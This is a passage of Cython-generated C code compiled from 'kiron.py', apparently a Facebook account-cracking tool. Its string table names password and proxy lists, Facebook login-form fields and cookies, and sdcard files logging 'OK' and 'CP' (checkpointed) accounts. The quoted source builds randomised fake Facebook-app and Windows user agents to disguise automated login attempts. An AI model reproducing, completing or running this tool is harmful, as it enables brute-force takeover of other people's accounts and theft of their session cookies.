    {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
    {&__pyx_n_s_mal, __pyx_k_mal, sizeof(__pyx_k_mal), 0, 0, 1, 1},
    {&__pyx_n_s_math, __pyx_k_math, sizeof(__pyx_k_math), 0, 0, 1, 1},
    {&__pyx_kp_s_max_age_0, __pyx_k_max_age_0, sizeof(__pyx_k_max_age_0), 0, 0, 1, 0},
    {&__pyx_n_s_max_workers, __pyx_k_max_workers, sizeof(__pyx_k_max_workers), 0, 0, 1, 1},
    {&__pyx_kp_s_mbasic_facebook_com, __pyx_k_mbasic_facebook_com, sizeof(__pyx_k_mbasic_facebook_com), 0, 0, 1, 0},
    {&__pyx_n_s_menu, __pyx_k_menu, sizeof(__pyx_k_menu), 0, 0, 1, 1},
    {&__pyx_n_s_message, __pyx_k_message, sizeof(__pyx_k_message), 0, 0, 1, 1},
    {&__pyx_n_s_meta_inf_fbmeta, __pyx_k_meta_inf_fbmeta, sizeof(__pyx_k_meta_inf_fbmeta), 0, 0, 1, 1},
    {&__pyx_n_s_method, __pyx_k_method, sizeof(__pyx_k_method), 0, 0, 1, 1},
    {&__pyx_n_s_mkdir, __pyx_k_mkdir, sizeof(__pyx_k_mkdir), 0, 0, 1, 1},
    {&__pyx_n_s_mmm, __pyx_k_mmm, sizeof(__pyx_k_mmm), 0, 0, 1, 1},
    {&__pyx_n_s_mmmm, __pyx_k_mmmm, sizeof(__pyx_k_mmmm), 0, 0, 1, 1},
    {&__pyx_n_s_mmmmm, __pyx_k_mmmmm, sizeof(__pyx_k_mmmmm), 0, 0, 1, 1},
    {&__pyx_n_s_mmp, __pyx_k_mmp, sizeof(__pyx_k_mmp), 0, 0, 1, 1},
    {&__pyx_n_s_mobile, __pyx_k_mobile, sizeof(__pyx_k_mobile), 0, 0, 1, 1},
    {&__pyx_kp_s_mod_txt, __pyx_k_mod_txt, sizeof(__pyx_k_mod_txt), 0, 0, 1, 0},
    {&__pyx_n_s_model, __pyx_k_model, sizeof(__pyx_k_model), 0, 0, 1, 1},
    {&__pyx_n_s_moe, __pyx_k_moe, sizeof(__pyx_k_moe), 0, 0, 1, 1},
    {&__pyx_n_s_month, __pyx_k_month, sizeof(__pyx_k_month), 0, 0, 1, 1},
    {&__pyx_n_s_motorola, __pyx_k_motorola, sizeof(__pyx_k_motorola), 0, 0, 1, 1},
    {&__pyx_n_s_mthd, __pyx_k_mthd, sizeof(__pyx_k_mthd), 0, 0, 1, 1},
    {&__pyx_n_s_n, __pyx_k_n, sizeof(__pyx_k_n), 0, 0, 1, 1},
    {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
    {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
    {&__pyx_kp_s_name_jazoest_value, __pyx_k_name_jazoest_value, sizeof(__pyx_k_name_jazoest_value), 0, 0, 1, 0},
    {&__pyx_kp_s_name_li_value, __pyx_k_name_li_value, sizeof(__pyx_k_name_li_value), 0, 0, 1, 0},
    {&__pyx_kp_s_name_lsd_value, __pyx_k_name_lsd_value, sizeof(__pyx_k_name_lsd_value), 0, 0, 1, 0},
    {&__pyx_kp_s_name_m_ts_value, __pyx_k_name_m_ts_value, sizeof(__pyx_k_name_m_ts_value), 0, 0, 1, 0},
    {&__pyx_n_s_names, __pyx_k_names, sizeof(__pyx_k_names), 0, 0, 1, 1},
    {&__pyx_n_s_navigate, __pyx_k_navigate, sizeof(__pyx_k_navigate), 0, 0, 1, 1},
    {&__pyx_n_s_network_country, __pyx_k_network_country, sizeof(__pyx_k_network_country), 0, 0, 1, 1},
    {&__pyx_n_s_none, __pyx_k_none, sizeof(__pyx_k_none), 0, 0, 1, 1},
    {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
    {&__pyx_n_s_oks, __pyx_k_oks, sizeof(__pyx_k_oks), 0, 0, 1, 1},
    {&__pyx_n_s_old, __pyx_k_old, sizeof(__pyx_k_old), 0, 0, 1, 1},
    {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
    {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
    {&__pyx_n_s_pas, __pyx_k_pas, sizeof(__pyx_k_pas), 0, 0, 1, 1},
    {&__pyx_n_s_pass, __pyx_k_pass, sizeof(__pyx_k_pass), 0, 0, 1, 1},
    {&__pyx_n_s_passlist, __pyx_k_passlist, sizeof(__pyx_k_passlist), 0, 0, 1, 1},
    {&__pyx_kp_s_password, __pyx_k_password, sizeof(__pyx_k_password), 0, 0, 1, 0},
    {&__pyx_n_s_password_2, __pyx_k_password_2, sizeof(__pyx_k_password_2), 0, 0, 1, 1},
    {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
    {&__pyx_n_s_pcp, __pyx_k_pcp, sizeof(__pyx_k_pcp), 0, 0, 1, 1},
    {&__pyx_kp_u_picture_type_normal, __pyx_k_picture_type_normal, sizeof(__pyx_k_picture_type_normal), 0, 1, 0, 0},
    {&__pyx_n_s_pip, __pyx_k_pip, sizeof(__pyx_k_pip), 0, 0, 1, 1},
    {&__pyx_kp_s_pip_install_requests_futures_2_d, __pyx_k_pip_install_requests_futures_2_d, sizeof(__pyx_k_pip_install_requests_futures_2_d), 0, 0, 1, 0},
    {&__pyx_n_s_platform, __pyx_k_platform, sizeof(__pyx_k_platform), 0, 0, 1, 1},
    {&__pyx_n_s_plist, __pyx_k_plist, sizeof(__pyx_k_plist), 0, 0, 1, 1},
    {&__pyx_n_s_po, __pyx_k_po, sizeof(__pyx_k_po), 0, 0, 1, 1},
    {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
    {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
    {&__pyx_n_s_proxsi, __pyx_k_proxsi, sizeof(__pyx_k_proxsi), 0, 0, 1, 1},
    {&__pyx_kp_s_proxy_txt, __pyx_k_proxy_txt, sizeof(__pyx_k_proxy_txt), 0, 0, 1, 0},
    {&__pyx_n_s_proxylist, __pyx_k_proxylist, sizeof(__pyx_k_proxylist), 0, 0, 1, 1},
    {&__pyx_n_s_ps, __pyx_k_ps, sizeof(__pyx_k_ps), 0, 0, 1, 1},
    {&__pyx_n_s_ps_limit, __pyx_k_ps_limit, sizeof(__pyx_k_ps_limit), 0, 0, 1, 1},
    {&__pyx_n_s_pw, __pyx_k_pw, sizeof(__pyx_k_pw), 0, 0, 1, 1},
    {&__pyx_kp_s_python_AYYUB_py, __pyx_k_python_AYYUB_py, sizeof(__pyx_k_python_AYYUB_py), 0, 0, 1, 0},
    {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
    {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
    {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
    {&__pyx_n_s_random_seed, __pyx_k_random_seed, sizeof(__pyx_k_random_seed), 0, 0, 1, 1},
    {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
    {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
    {&__pyx_n_s_rc, __pyx_k_rc, sizeof(__pyx_k_rc), 0, 0, 1, 1},
    {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
    {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
    {&__pyx_n_s_redmi, __pyx_k_redmi, sizeof(__pyx_k_redmi), 0, 0, 1, 1},
    {&__pyx_n_s_reg_instance, __pyx_k_reg_instance, sizeof(__pyx_k_reg_instance), 0, 0, 1, 1},
    {&__pyx_n_s_regular, __pyx_k_regular, sizeof(__pyx_k_regular), 0, 0, 1, 1},
    {&__pyx_n_s_replace, __pyx_k_replace, sizeof(__pyx_k_replace), 0, 0, 1, 1},
    {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
    {&__pyx_n_s_res, __pyx_k_res, sizeof(__pyx_k_res), 0, 0, 1, 1},
    {&__pyx_n_s_resrr, __pyx_k_resrr, sizeof(__pyx_k_resrr), 0, 0, 1, 1},
    {&__pyx_n_s_ress, __pyx_k_ress, sizeof(__pyx_k_ress), 0, 0, 1, 1},
    {&__pyx_n_s_rnd, __pyx_k_rnd, sizeof(__pyx_k_rnd), 0, 0, 1, 1},
    {&__pyx_n_s_rp, __pyx_k_rp, sizeof(__pyx_k_rp), 0, 0, 1, 1},
    {&__pyx_n_s_rr, __pyx_k_rr, sizeof(__pyx_k_rr), 0, 0, 1, 1},
    {&__pyx_n_s_scheme, __pyx_k_scheme, sizeof(__pyx_k_scheme), 0, 0, 1, 1},
    {&__pyx_kp_s_sdcard_AYYUB, __pyx_k_sdcard_AYYUB, sizeof(__pyx_k_sdcard_AYYUB), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_AYYUB_CP_txt, __pyx_k_sdcard_AYYUB_CP_txt, sizeof(__pyx_k_sdcard_AYYUB_CP_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_AYYUB_FILE_M1_OK_txt, __pyx_k_sdcard_AYYUB_FILE_M1_OK_txt, sizeof(__pyx_k_sdcard_AYYUB_FILE_M1_OK_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_AYYUB_FILE_M2_OK_txt, __pyx_k_sdcard_AYYUB_FILE_M2_OK_txt, sizeof(__pyx_k_sdcard_AYYUB_FILE_M2_OK_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_AYYUB_OLD_txt, __pyx_k_sdcard_AYYUB_OLD_txt, sizeof(__pyx_k_sdcard_AYYUB_OLD_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_AYYUB_RND_CP_txt, __pyx_k_sdcard_AYYUB_RND_CP_txt, sizeof(__pyx_k_sdcard_AYYUB_RND_CP_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_AYYUB_RND_M1_OK_COKIE_tx, __pyx_k_sdcard_AYYUB_RND_M1_OK_COKIE_tx, sizeof(__pyx_k_sdcard_AYYUB_RND_M1_OK_COKIE_tx), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_kiron_py, __pyx_k_sdcard_kiron_py, sizeof(__pyx_k_sdcard_kiron_py), 0, 0, 1, 0},
    {&__pyx_n_s_se, __pyx_k_se, sizeof(__pyx_k_se), 0, 0, 1, 1},
    {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
    {&__pyx_kp_s_sec_ch_prefers_color_scheme, __pyx_k_sec_ch_prefers_color_scheme, sizeof(__pyx_k_sec_ch_prefers_color_scheme), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua_full_version_list, __pyx_k_sec_ch_ua_full_version_list, sizeof(__pyx_k_sec_ch_ua_full_version_list), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_user, __pyx_k_sec_fetch_user, sizeof(__pyx_k_sec_fetch_user), 0, 0, 1, 0},
    {&__pyx_n_s_secure, __pyx_k_secure, sizeof(__pyx_k_secure), 0, 0, 1, 1},
    {&__pyx_n_s_select, __pyx_k_select, sizeof(__pyx_k_select), 0, 0, 1, 1},
    {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
    {&__pyx_n_s_ses, __pyx_k_ses, sizeof(__pyx_k_ses), 0, 0, 1, 1},
    {&__pyx_n_s_session, __pyx_k_session, sizeof(__pyx_k_session), 0, 0, 1, 1},
    {&__pyx_n_s_session_cookies, __pyx_k_session_cookies, sizeof(__pyx_k_session_cookies), 0, 0, 1, 1},
    {&__pyx_n_s_session_id, __pyx_k_session_id, sizeof(__pyx_k_session_id), 0, 0, 1, 1},
    {&__pyx_n_s_session_key, __pyx_k_session_key, sizeof(__pyx_k_session_key), 0, 0, 1, 1},
    {&__pyx_kp_s_sessions_py, __pyx_k_sessions_py, sizeof(__pyx_k_sessions_py), 0, 0, 1, 0},
    {&__pyx_n_s_sexkey, __pyx_k_sexkey, sizeof(__pyx_k_sexkey), 0, 0, 1, 1},
    {&__pyx_n_s_shell, __pyx_k_shell, sizeof(__pyx_k_shell), 0, 0, 1, 1},
    {&__pyx_n_s_sim_country, __pyx_k_sim_country, sizeof(__pyx_k_sim_country), 0, 0, 1, 1},
    {&__pyx_n_s_sim_id, __pyx_k_sim_id, sizeof(__pyx_k_sim_id), 0, 0, 1, 1},
    {&__pyx_n_s_sim_serials, __pyx_k_sim_serials, sizeof(__pyx_k_sim_serials), 0, 0, 1, 1},
    {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
    {&__pyx_n_s_smtplib, __pyx_k_smtplib, sizeof(__pyx_k_smtplib), 0, 0, 1, 1},
    {&__pyx_kp_s_socksku_txt, __pyx_k_socksku_txt, sizeof(__pyx_k_socksku_txt), 0, 0, 1, 0},
    {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
    {&__pyx_n_s_spec, __pyx_k_spec, sizeof(__pyx_k_spec), 0, 0, 1, 1},
    {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
    {&__pyx_n_s_splitlines, __pyx_k_splitlines, sizeof(__pyx_k_splitlines), 0, 0, 1, 1},
    {&__pyx_n_s_ssbb, __pyx_k_ssbb, sizeof(__pyx_k_ssbb), 0, 0, 1, 1},
    {&__pyx_n_s_star, __pyx_k_star, sizeof(__pyx_k_star), 0, 0, 1, 1},
    {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
    {&__pyx_n_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 1},
    {&__pyx_n_s_submit, __pyx_k_submit, sizeof(__pyx_k_submit), 0, 0, 1, 1},
    {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
    {&__pyx_kp_u_swan_mibrowser, __pyx_k_swan_mibrowser, sizeof(__pyx_k_swan_mibrowser), 0, 1, 0, 0},
    {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
    {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
    {&__pyx_n_s_tag, __pyx_k_tag, sizeof(__pyx_k_tag), 0, 0, 1, 1},
    {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
    {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
    {&__pyx_kp_s_text_html_application_xhtml_xml, __pyx_k_text_html_application_xhtml_xml, sizeof(__pyx_k_text_html_application_xhtml_xml), 0, 0, 1, 0},
    {&__pyx_n_s_tgl, __pyx_k_tgl, sizeof(__pyx_k_tgl), 0, 0, 1, 1},
    {&__pyx_n_s_thn, __pyx_k_thn, sizeof(__pyx_k_thn), 0, 0, 1, 1},
    {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
    {&__pyx_n_s_tier, __pyx_k_tier, sizeof(__pyx_k_tier), 0, 0, 1, 1},
    {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
    {&__pyx_n_s_tks, __pyx_k_tks, sizeof(__pyx_k_tks), 0, 0, 1, 1},
    {&__pyx_n_s_tl, __pyx_k_tl, sizeof(__pyx_k_tl), 0, 0, 1, 1},
    {&__pyx_n_s_tokenku, __pyx_k_tokenku, sizeof(__pyx_k_tokenku), 0, 0, 1, 1},
    {&__pyx_n_s_total, __pyx_k_total, sizeof(__pyx_k_total), 0, 0, 1, 1},
    {&__pyx_n_s_total_ids, __pyx_k_total_ids, sizeof(__pyx_k_total_ids), 0, 0, 1, 1},
    {&__pyx_n_s_tred, __pyx_k_tred, sizeof(__pyx_k_tred), 0, 0, 1, 1},
    {&__pyx_n_s_true, __pyx_k_true, sizeof(__pyx_k_true), 0, 0, 1, 1},
    {&__pyx_n_s_try_num, __pyx_k_try_num, sizeof(__pyx_k_try_num), 0, 0, 1, 1},
    {&__pyx_n_s_try_number, __pyx_k_try_number, sizeof(__pyx_k_try_number), 0, 0, 1, 1},
    {&__pyx_n_s_twf, __pyx_k_twf, sizeof(__pyx_k_twf), 0, 0, 1, 1},
    {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
    {&__pyx_n_s_uid, __pyx_k_uid, sizeof(__pyx_k_uid), 0, 0, 1, 1},
    {&__pyx_n_s_uidx, __pyx_k_uidx, sizeof(__pyx_k_uidx), 0, 0, 1, 1},
    {&__pyx_n_s_unknown, __pyx_k_unknown, sizeof(__pyx_k_unknown), 0, 0, 1, 1},
    {&__pyx_n_s_uno, __pyx_k_uno, sizeof(__pyx_k_uno), 0, 0, 1, 1},
    {&__pyx_n_s_unrecognized_tries, __pyx_k_unrecognized_tries, sizeof(__pyx_k_unrecognized_tries), 0, 0, 1, 1},
    {&__pyx_kp_s_upgrade_insecure_requests, __pyx_k_upgrade_insecure_requests, sizeof(__pyx_k_upgrade_insecure_requests), 0, 0, 1, 0},
    {&__pyx_n_s_urandom, __pyx_k_urandom, sizeof(__pyx_k_urandom), 0, 0, 1, 1},
    {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
    {&__pyx_n_s_urllib, __pyx_k_urllib, sizeof(__pyx_k_urllib), 0, 0, 1, 1},
    {&__pyx_n_s_urllib3, __pyx_k_urllib3, sizeof(__pyx_k_urllib3), 0, 0, 1, 1},
    {&__pyx_n_s_urllib_request, __pyx_k_urllib_request, sizeof(__pyx_k_urllib_request), 0, 0, 1, 1},
    {&__pyx_n_s_urlopen, __pyx_k_urlopen, sizeof(__pyx_k_urlopen), 0, 0, 1, 1},
    {&__pyx_n_s_us, __pyx_k_us, sizeof(__pyx_k_us), 0, 0, 1, 1},
    {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
    {&__pyx_kp_s_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 0, 1, 0},
    {&__pyx_n_s_usergent, __pyx_k_usergent, sizeof(__pyx_k_usergent), 0, 0, 1, 1},
    {&__pyx_kp_s_utf_8, __pyx_k_utf_8, sizeof(__pyx_k_utf_8), 0, 0, 1, 0},
    {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
    {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
    {&__pyx_n_s_value, __pyx_k_value, sizeof(__pyx_k_value), 0, 0, 1, 1},
    {&__pyx_n_s_verify, __pyx_k_verify, sizeof(__pyx_k_verify), 0, 0, 1, 1},
    {&__pyx_kp_s_viewport_width, __pyx_k_viewport_width, sizeof(__pyx_k_viewport_width), 0, 0, 1, 0},
    {&__pyx_n_s_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 0, 1, 1},
    {&__pyx_kp_s_width, __pyx_k_width, sizeof(__pyx_k_width), 0, 0, 1, 0},
    {&__pyx_n_s_windows, __pyx_k_windows, sizeof(__pyx_k_windows), 0, 0, 1, 1},
    {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
    {&__pyx_kp_s_www_facebook_com, __pyx_k_www_facebook_com, sizeof(__pyx_k_www_facebook_com), 0, 0, 1, 0},
    {&__pyx_n_s_x, __pyx_k_x, sizeof(__pyx_k_x), 0, 0, 1, 1},
    {&__pyx_kp_s_x_fb_connection_bandwidth, __pyx_k_x_fb_connection_bandwidth, sizeof(__pyx_k_x_fb_connection_bandwidth), 0, 0, 1, 0},
    {&__pyx_kp_s_x_fb_connection_quality, __pyx_k_x_fb_connection_quality, sizeof(__pyx_k_x_fb_connection_quality), 0, 0, 1, 0},
    {&__pyx_kp_s_x_fb_connection_type, __pyx_k_x_fb_connection_type, sizeof(__pyx_k_x_fb_connection_type), 0, 0, 1, 0},
    {&__pyx_kp_s_x_fb_http_engine, __pyx_k_x_fb_http_engine, sizeof(__pyx_k_x_fb_http_engine), 0, 0, 1, 0},
    {&__pyx_kp_s_x_fb_net_hni, __pyx_k_x_fb_net_hni, sizeof(__pyx_k_x_fb_net_hni), 0, 0, 1, 0},
    {&__pyx_kp_s_x_fb_sim_hni, __pyx_k_x_fb_sim_hni, sizeof(__pyx_k_x_fb_sim_hni), 0, 0, 1, 0},
    {&__pyx_n_s_xd, __pyx_k_xd, sizeof(__pyx_k_xd), 0, 0, 1, 1},
    {&__pyx_kp_s_xdg_open_https_wa_me_88019097655, __pyx_k_xdg_open_https_wa_me_88019097655, sizeof(__pyx_k_xdg_open_https_wa_me_88019097655), 0, 0, 1, 0},
    {&__pyx_kp_s_xdg_open_https_www_facebook_com, __pyx_k_xdg_open_https_www_facebook_com, sizeof(__pyx_k_xdg_open_https_www_facebook_com), 0, 0, 1, 0},
    {&__pyx_n_s_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 0, 1, 1},
    {&__pyx_n_s_year, __pyx_k_year, sizeof(__pyx_k_year), 0, 0, 1, 1},
    {&__pyx_n_s_yes, __pyx_k_yes, sizeof(__pyx_k_yes), 0, 0, 1, 1},
    {&__pyx_n_s_zlib, __pyx_k_zlib, sizeof(__pyx_k_zlib), 0, 0, 1, 1},
    {0, 0, 0, 0, 0, 0, 0}
  };
  return __Pyx_InitStrings(__pyx_string_tab);
}
/* #### Code section: cached_builtins ### */
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 15, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 18, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 22, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 42, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 169, __pyx_L1_error)
  __pyx_builtin_ValueError = __Pyx_GetBuiltinName(__pyx_n_s_ValueError); if (!__pyx_builtin_ValueError) __PYX_ERR(0, 325, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}
/* #### Code section: cached_constants ### */

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  /* "kiron.py":131
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)
 * def linex():print(f'\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():
 */
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_u_1_97m_1_37m); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 131, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  /* "kiron.py":134
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"             # <<<<<<<<<<<<<<
 *         return ua
 * #__________________[ M2 ]__________________#
 */
  __pyx_tuple__2 = PyTuple_Pack(2, __pyx_int_11, __pyx_int_77); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);
  __pyx_tuple__3 = PyTuple_Pack(2, __pyx_int_9, __pyx_int_49); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);
  __pyx_tuple__4 = PyTuple_Pack(2, __pyx_int_1111111, __pyx_int_7777777); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

  /* "kiron.py":143
 * #old ua def[]
 * def windows():
 *     aV=str(random.choice(range(10,20)))             # <<<<<<<<<<<<<<
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 *     bV=str(random.choice(range(1,36)))
 */
  __pyx_tuple__5 = PyTuple_Pack(2, __pyx_int_10, __pyx_int_20); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 143, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);

  /* "kiron.py":144
 * def windows():
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"             # <<<<<<<<<<<<<<
 *     bV=str(random.choice(range(1,36)))
 *     bx=str(random.choice(range(34,38)))
 */
  __pyx_tuple__6 = PyTuple_Pack(2, __pyx_int_5, __pyx_int_7); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);
  __pyx_tuple__7 = PyTuple_Pack(2, __pyx_int_8, __pyx_int_12); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);
  __pyx_tuple__8 = PyTuple_Pack(2, __pyx_int_552, __pyx_int_661); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 144, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);

  /* "kiron.py":145
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 *     bV=str(random.choice(range(1,36)))             # <<<<<<<<<<<<<<
 *     bx=str(random.choice(range(34,38)))
 *     bz=f"5{bx}.{bV}"
 */
  __pyx_tuple__9 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_36); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 145, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  /* "kiron.py":146
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 *     bV=str(random.choice(range(1,36)))
 *     bx=str(random.choice(range(34,38)))             # <<<<<<<<<<<<<<
 *     bz=f"5{bx}.{bV}"
 *     B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
 */
